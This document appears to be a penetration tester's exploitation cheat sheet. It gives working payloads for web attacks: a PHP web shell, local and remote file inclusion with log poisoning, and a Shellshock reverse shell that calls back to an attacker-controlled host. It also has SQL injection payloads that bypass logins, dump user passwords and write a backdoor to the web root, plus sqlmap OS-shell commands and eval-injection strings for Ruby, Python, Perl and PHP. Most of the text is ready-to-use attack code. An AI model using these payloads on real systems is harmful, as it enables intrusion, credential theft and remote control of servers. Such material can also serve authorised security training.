# Exploitation

## <a href='https://github.com/leecybersec/web-shell' target="blank">WebShell</a>

## Virtual hosting

> Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers).

``` bash
$ cat /etc/hosts

127.0.0.1       localhost
192.168.11.134 weakness.jth
```

## Create Passwd Directory for Brute Force

``` bash
cewl -m 5 http://$ip/joomla/ > passwd.txt
```

## Directory Traversal

Unix

``` bash
/etc/passwd
```

Windows

``` cmd
c:\boot.ini
c:\windows\system32\drivers\etc\hosts
```

## File Inclusion

### Local File Inclusion

``` bash
$ nc -nv 192.168.11.131 80
(UNKNOWN) [192.168.11.131] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

HTTP/1.1 400 Bad Request
```

``` bash
curl http://192.168.11.131/file.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

### Remote File Inclusion

``` php
<?php echo shell_exec($_GET['cmd']); ?>
```

``` bash
curl http://target/?page=http://$ip/backdoor.php&cmd=id
```

## <a href='https://github.com/mubix/shellshocker-pocs' target="blank">Shellshock POC</a>

``` bash
curl -H "user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/$myip/445 0>&1'" http://$ip/cgi-bin/user.sh
```

### PHP Wrappers

``` bash
http://192.168.11.131/file.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

## SQL Injection

### Authentication Bypass

``` bash
admin' or 1=1 LIMIT 1;#
```

### Enumerating the Database

``` bash
order by 3
```

``` bash
union all select 1, 2, 3
```

``` bash
union all select 1, @@version, 3
```

``` bash
union all select 1, table_name from information_schema.tables, 3
```

``` bash
union all select 1, column_name from information_schema.columns where table_name='users', 3
```

``` bash
union all select 1, username, password from users
```

### SQLi to Code Execution

Read file

``` bash
union all select 1, load_file('C:/Windows/System32/drivers/etc/hosts'), 3
```

Write backdoor

``` bash
union all select 1, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php', 3
```

### Automating SQL Injection

``` bash
sqlmap -u http://$ip/debug.php?id=1 -p "id"
```

dump databases

``` bash
sqlmap -u http://$ip/debug.php?id=1 -p "id" --dbms=mysql --dump
```

execute a shell

``` bash
sqlmap -u http://$ip/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```

## Command Execution

```bash
;id
`id`
$(id)
```

## Code Execution

### Ruby 

``` bash
eval "\""+params['1']+"\""

?1="%2b`id`%2b"
```

### Python

``` bash
eval('"'+1+'"')

"%2bos.system('id')%2b"

"%2bos.popen('id').read()%2b"

"%2b__import__('os').popen('id').read()%2b"

"%2b__import__('os').popen(__import__('base64').b64decode('aWQ=')).read()%2b"
```

### Perl

``` bash
eval("return '".$FORM{1}."'");

/cgi-bin/form?1='.`id`.'
```

### PHP

<a href='https://www.php.net/manual/en/function.eval.php' target="blank">eval()</a>

``` bash
$s="echo \"".$_GET['1']."\";";

eval($s);

?1=".system('id')."
```

usort()

``` bash
$1 = $_GET["1"];

usort(function('$a, $b', 'return strcmp($a->'.$1.',$b->'.$1.');'));

?1=id);}system('id');//
```

preg_replace()

``` bash
preg_replace($_GET["1"], $_GET["2"], $_GET["3"]);

?1=/x/e&2=system('id')&3=x
```

assert()

``` bash
assert(trim("'".$_GET['1']."'"));

echo htmlentities($_GET['1']);

?1=hacker'.system('id').'
```